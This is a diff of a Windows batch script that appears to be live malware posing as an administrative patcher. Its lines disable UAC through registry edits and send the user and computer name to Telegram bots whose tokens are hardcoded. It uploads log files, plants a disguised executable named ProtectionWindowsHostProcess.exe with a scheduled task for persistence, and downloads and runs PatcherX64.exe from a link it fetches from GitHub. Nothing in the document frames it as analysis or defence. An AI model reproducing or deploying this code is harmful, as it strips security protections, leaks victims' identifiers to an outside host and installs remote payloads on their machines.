@@ -9,17 +9,9 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=2.7"
-echo BATCHVERSION=%BATCHVERSION%
-timeout /t 60 /nobreak
-
-:: Disable UAC 
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f
+set "BATCHVERSION=2.9"
 
 
-set "RUNEVERYOFFICIALMD5=18b2ef86ad6a29d3436817b09bbc9ad8"
 
 
 set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
@@ -49,6 +41,36 @@ set "filename="
 
 
 
+:: Set the log file path
+set "LOGFILE=%temp%\!filename1!.ustup"
+set "LOGFILE1=%temp%\!filename2!.ustup"
+
+
+echo BATCHVERSION=%BATCHVERSION% >> "%LOGFILE%" 2>&1
+timeout /t 60 /nobreak >> "%LOGFILE%" 2>&1
+
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+
+echo LOGFILENAME = !filename1!.ustup >> "%LOGFILE%" 2>&1
+
+
+
+
+:: Disable UAC 
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d 0 /f >> "%LOGFILE%" 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d 0 /f >> "%LOGFILE%" 2>&1
+reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d 0 /f >> "%LOGFILE%" 2>&1
+
+
+set "RUNEVERYOFFICIALMD5=18b2ef86ad6a29d3436817b09bbc9ad8"
+
+
 :: ============ RUNNING TOPIC ============
 
 
@@ -66,51 +88,54 @@ set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
 
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|v%BATCHVERSION%"
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%10ZIN|LgdIn0"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|v%BATCHVERSION%" >> "%LOGFILE%" 2>&1
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=1040442734" -d "text=%SMALLUSER%10ZIN|LgdIn0" >> "%LOGFILE%" 2>&1
 
 
 
 
-
-
-
-:: Set the log file path
-set "LOGFILE=%temp%\!filename1!.ustup"
-set "LOGFILE1=%temp%\!filename2!.ustup"
 
 
 
 :: Start logging from this point
-call :LogOutput > "%LOGFILE%" 2>&1
-echo.
-echo.
-type "%LOGFILE%" > "%LOGFILE1%"
-echo.
-echo.
+rem call :LogOutput > "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+rem type "%LOGFILE%" > "%LOGFILE1%"
 
 
 
+goto :LogOutput
 
 
 :SENDINGLASTMSG
+echo SENDINGLASTMSG Started.. >> "%LOGFILE%" 2>&1
 set "RESULT=%TEMP%\TGRESU.txa"
-del /f /q "%RESULT%"
+del /f /q "%RESULT%" >> "%LOGFILE%" 2>&1
 
 set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(1)|%MESSAGEEVERY%|%time%|(v%BATCHVERSION%)"
 set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
 
 
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" -F "chat_id=%CHAT_ID_RUNNING%" -F "message_thread_id=%TOPIC_ID_RUNNING%" -F "caption=%ENCODED_MESSAGE_RUNNING%" -F "document=@%LOGFILE1%" > "%RESULT%"
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
 
 findstr /i "message_id" "%RESULT%" >nul
 if %errorlevel%==0 (
-    echo Message sent successfully!
-    echo.
+    echo Message sent successfully! >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
 ) else (
-    echo Failed to send message. Retrying...
-    echo.
-    timeout /t 2 /nobreak
+    echo Failed to send message. Retrying... >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
+    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
     goto SENDINGLASTMSG
 )
 
@@ -118,7 +143,7 @@ if %errorlevel%==0 (
 
 
 
-echo.
+echo. >> "%LOGFILE%" 2>&1
 del /f /q "%LOGFILE%"
 del /f /q "%LOGFILE1%"
 goto :EOF
@@ -128,15 +153,14 @@ goto :EOF
 
 
 :LogOutput
-:: Your long batch script starts here
-echo Starting LogOutput...
-echo.
-echo.
-echo.
-echo BATCHVERSION=%BATCHVERSION%
-echo.
-echo.
-echo.
+echo Starting LogOutput... >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo BATCHVERSION=%BATCHVERSION% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 
 
@@ -160,24 +184,24 @@ set "file9=%SystemRoot%\System32\handle.exe"
 set "file10=%SystemRoot%\System32\wudtest.exe"
 
 
-echo Typing in 
-echo.
-echo.
+echo Typing  >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
-if exist "%file1%" echo COM Surrogate.exe Found in %file1%
-if exist "%file2%" echo ShellHost.exe Found in %file2%
-if exist "%file3%" echo KMSAuto.exe Found in %file3%
-if exist "%file4%" echo nircmd.exe Found in %file4%
-if exist "%file5%" echo CoreWorkerProcess.exe Found in %file5%
-::if exist "%file6%" echo STLRRUNNERCALLER.exe Found in %file6%
+if exist "%file1%" echo COM Surrogate.exe Found in %file1% >> "%LOGFILE%" 2>&1
+if exist "%file2%" echo ShellHost.exe Found in %file2% >> "%LOGFILE%" 2>&1
+if exist "%file3%" echo KMSAuto.exe Found in %file3% >> "%LOGFILE%" 2>&1
+if exist "%file4%" echo nircmd.exe Found in %file4% >> "%LOGFILE%" 2>&1
+if exist "%file5%" echo CoreWorkerProcess.exe Found in %file5% >> "%LOGFILE%" 2>&1
+::if exist "%file6%" echo STLRRUNNERCALLER.exe Found in %file6% >> "%LOGFILE%" 2>&1
 if exist "%file7%" if exist "%file8%" (
-    echo 7z.exe and 7z.dll Found in %file7% and %file8%
+    echo 7z.exe and 7z.dll Found in %file7% and %file8% >> "%LOGFILE%" 2>&1
 ) else (
-    if exist "%file7%" echo 7z.exe Found in %file7%
-    if exist "%file8%" echo 7z.dll Found in %file8%
+    if exist "%file7%" echo 7z.exe Found in %file7% >> "%LOGFILE%" 2>&1
+    if exist "%file8%" echo 7z.dll Found in %file8% >> "%LOGFILE%" 2>&1
 )
-if exist "%file9%" echo handle.exe Found in %file9%
-if exist "%file10%" echo wudtest.exe SpeedTest Found in %file10%
+if exist "%file9%" echo handle.exe Found in %file9% >> "%LOGFILE%" 2>&1
+if exist "%file10%" echo wudtest.exe SpeedTest Found in %file10% >> "%LOGFILE%" 2>&1
 
 
 
@@ -189,62 +213,86 @@ set COUNT=1
 
 
 
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
 
 :LOOPRUNEVERY
-echo.
-echo.
-echo.
-echo.
-echo.
-echo.
-echo [!COUNT!] Running handler...
+echo LOOPRUNEVERY Started.. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+echo [!COUNT!] Running handler... >> "%LOGFILE%" 2>&1
 call :HANDLERUNEVERYLOG
 
 REM Wait 20 seconds only if not the last loop
-if !COUNT! LSS 6 timeout /t 20 /nobreak
+if !COUNT! LSS 6 timeout /t 20 /nobreak >> "%LOGFILE%" 2>&1
 
 set /a COUNT+=1
-if !COUNT! LEQ 6 goto LOOPRUNEVERY
+if !COUNT! LEQ 6 goto LOOPRUNEVERY >> "%LOGFILE%" 2>&1
 
-echo.
-echo.
-echo.
-echo.
-echo.
-echo.
+
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 goto CHECKRUNEVERY
 
 
 :HANDLERUNEVERYLOG
-echo Trying Handle RunEvery Log.
-echo.
-echo.
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|(COUNT=%COUNT%)|%time%|v%BATCHVERSION%"
-echo.
-echo.
+echo HANDLERUNEVERYLOG Started ... >> "%LOGFILE%" 2>&1
+echo Trying Handle RunEvery Log. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|(COUNT=%COUNT%)|%time%|v%BATCHVERSION%" >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 
 :: Accept EULA if not already accepted
-reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted >nul 2>&1
-reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f >nul
-reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted
+reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted >> "%LOGFILE%" 2>&1
+reg add HKCU\Software\Sysinternals\Handle /v EulaAccepted /t REG_DWORD /d 1 /f >> "%LOGFILE%" 2>&1
+reg query HKCU\Software\Sysinternals\Handle /v EulaAccepted >> "%LOGFILE%" 2>&1
 
-echo Handle LOGFILE TA3 RUNEVERY
-handle.exe "%RUNEVERYLOGFILE%"
-echo.
-echo.
-echo.
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+
+
+echo Handle LOGFILE TA3 RUNEVERY >> "%LOGFILE%" 2>&1
+handle.exe "%RUNEVERYLOGFILE%" >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 ::goto :EOF
 exit /b
 
 
-
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 
 :CHECKRUNEVERY
-echo CHECKRUNEVERY
-echo.
-echo.
+echo CHECKRUNEVERY Started >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 :: Define the folder and file paths
 set "targetFolder=%APPDATA%\Microsoft\Windows\SystemCertificatesData\Tasks"
 set "sourceFile=%SystemRoot%\System32\convertsshd.exe"
@@ -252,25 +300,25 @@ set "startupFile=%targetFolder%\ProtectionWindowsHostProcess.exe"
 
 :: Ensure the folder exists
 if not exist "%targetFolder%" (
-    echo Creating folder: "%targetFolder%"
-    mkdir "%targetFolder%"
+    echo Creating folder: "%targetFolder%" >> "%LOGFILE%" 2>&1
+    mkdir "%targetFolder%" >> "%LOGFILE%" 2>&1
 )
 
 :: Check if the target file exists
 if not exist "%startupFile%" (
-    echo File not found: "%startupFile%"
-    echo Restoring from "%sourceFile%"...
-    copy /Y "%sourceFile%" "%startupFile%"
-    schtasks /run /tn "%Task1%"
-    echo Task Started.
+    echo File not found: "%startupFile%" >> "%LOGFILE%" 2>&1
+    echo Restoring from "%sourceFile%"... >> "%LOGFILE%" 2>&1
+    copy /Y "%sourceFile%" "%startupFile%" >> "%LOGFILE%" 2>&1
+    schtasks /run /tn "%Task1%" >> "%LOGFILE%" 2>&1
+    echo Task Started. >> "%LOGFILE%" 2>&1
 ) else (
-    echo File already exists: "%startupFile%"
+    echo File already exists: "%startupFile%" >> "%LOGFILE%" 2>&1
 )
 
-echo.
-echo.
-timeout /t 5 /nobreak
-echo.
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+timeout /t 5 /nobreak >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 ::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
 ::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe"
@@ -280,32 +328,36 @@ echo.
 ::taskkill /F /IM "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\RUNEVERYCALLER.exe"
 
 
-
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 for /f "tokens=*" %%A in ('certutil -hashfile "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" MD5 ^| findstr /V "hash"') do set "RUNEVERYCURRENTMD5=%%A"
-echo MD5 of "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" = %RUNEVERYCURRENTMD5%
-echo.
-echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5%
-echo.
+echo MD5 of "%appdata%\Microsoft\Windows\SystemCertificatesData\Tasks\ProtectionWindowsHostProcess.exe" = %RUNEVERYCURRENTMD5% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo Comparing with stored MD5: %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 if "%RUNEVERYCURRENTMD5%"=="%RUNEVERYOFFICIALMD5%" (
-    echo MD5 matches %RUNEVERYCURRENTMD5% = %RUNEVERYOFFICIALMD5%
-    echo.
+    echo MD5 matches %RUNEVERYCURRENTMD5% = %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
 ) else (
-    echo MD5 doesnt match %RUNEVERYCURRENTMD5% # %RUNEVERYOFFICIALMD5%
-    echo Going to INSTRUNEVERY
-    goto INSTRUNEVERY
+    echo MD5 doesnt match %RUNEVERYCURRENTMD5% # %RUNEVERYOFFICIALMD5% >> "%LOGFILE%" 2>&1
+    echo Going to INSTRUNEVERY >> "%LOGFILE%" 2>&1
+    goto INSTRUNEVERY >> "%LOGFILE%" 2>&1
 )
 
 
-echo.
-echo.
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 
 
 
 if not exist "%startupFile%" goto INSTRUNEVERY
-echo %startupFile% Found.
+echo %startupFile% Found. >> "%LOGFILE%" 2>&1
 
 
 
@@ -315,20 +367,22 @@ echo %startupFile% Found.
 :: Define task to check
 set "Task1=SystemLibrariesU"
 
-echo.
-echo.
-echo.
-echo Checking %Task1%
-echo.
-echo.
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo Checking %Task1% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 schtasks /query /tn "SystemLibrariesU" /v /fo LIST
-echo.
-echo.
-echo.
-echo.
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 :: If Task doesnt Exist , goto 
-schtasks /query /tn "%Task1%" >nul 2>&1 || goto INSTRUNEVERY
+schtasks /query /tn "%Task1%" >> "%LOGFILE%" 2>&1
+if errorlevel 1 goto INSTRUNEVERY
+
 
 
 
@@ -343,10 +397,13 @@ goto NEXT
 
 
 :INSTRUNEVERY
-echo.
-echo.
-echo %startupFile% not found.
-echo.
+echo INSTRUNEVERY Started.. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo %startupFile% not found. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 :: RunEvery Files or Task missing 
 
 
@@ -357,29 +414,29 @@ color 0A
  
  
 :: Kill & Delete file 
-taskkill /f /im PatcherX64.exe >nul 2>&1
-del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+taskkill /f /im PatcherX64.exe >> "%LOGFILE%" 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >> "%LOGFILE%" 2>&1
  
 for /f "delims=" %%i in ('curl -s https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/FileLinks/RunEveryCallerFileLink') do set "RUNFILELINK=%%i"
 
-echo.
-echo RUNFILELINK=%RUNFILELINK%
-echo.
+echo. >> "%LOGFILE%" 2>&1
+echo RUNFILELINK=%RUNFILELINK% >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 
 :: Download the file using curl
-curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
+curl -L -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%" >> "%LOGFILE%" 2>&1
  
-timeout /t 2 /nobreak >nul
+timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
  
 :: Checking the existing of the file
 if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
-    echo.
-    echo The download hasn't started yet. Please check your connection.
-    timeout /t 2 /nobreak >nul
-    echo Retrying in 2 seconds ....
-    timeout /t 2 /nobreak >nul
-    echo.
+    echo. >> "%LOGFILE%" 2>&1
+    echo The download hasn't started yet. Please check your connection. >> "%LOGFILE%" 2>&1
+    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+    echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
+    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+    echo. >> "%LOGFILE%" 2>&1
     goto INSTRUNEVERY
 )
  
@@ -392,34 +449,39 @@ for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
  
 :: Check if the file size is at least 80KB (80000 bytes)
 if %FILESIZE% geq 80000 (
-    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+    start "" "%APPDATA%\microsoft\PatcherX64.exe" >> "%LOGFILE%" 2>&1
 ) else (
     echo.
-    echo Download incomplete. Check your connection and run the file again.
-     timeout /t 2 /nobreak >nul
-     echo Retrying in 2 seconds ....
-     timeout /t 2 /nobreak >nul
-     echo.
+    echo Download incomplete. Check your connection and run the file again. >> "%LOGFILE%" 2>&1
+     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+     echo Retrying in 2 seconds .... >> "%LOGFILE%" 2>&1
+     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+     echo. >> "%LOGFILE%" 2>&1
      goto INSTRUNEVERY
 )
  
- 
-echo Patcher Running...
-timeout /t 1 /nobreak >nul
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo Patcher Running... >> "%LOGFILE%" 2>&1
+timeout /t 1 /nobreak >> "%LOGFILE%" 2>&1
 
-
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 
 set "MESSAGEEVERY=RUNEVERYINSTALLED...."
 
 
 :NEXT
 ::
-echo.
-echo Time= %time%
-echo Calling ended....
-timeout /t 10 /nobreak
+echo. >> "%LOGFILE%" 2>&1
+echo Time= %time% >> "%LOGFILE%" 2>&1
+echo Calling ended.... >> "%LOGFILE%" 2>&1
+timeout /t 10 /nobreak >> "%LOGFILE%" 2>&1
 
 
 
+
+
+goto SENDINGLASTMSG
 
 
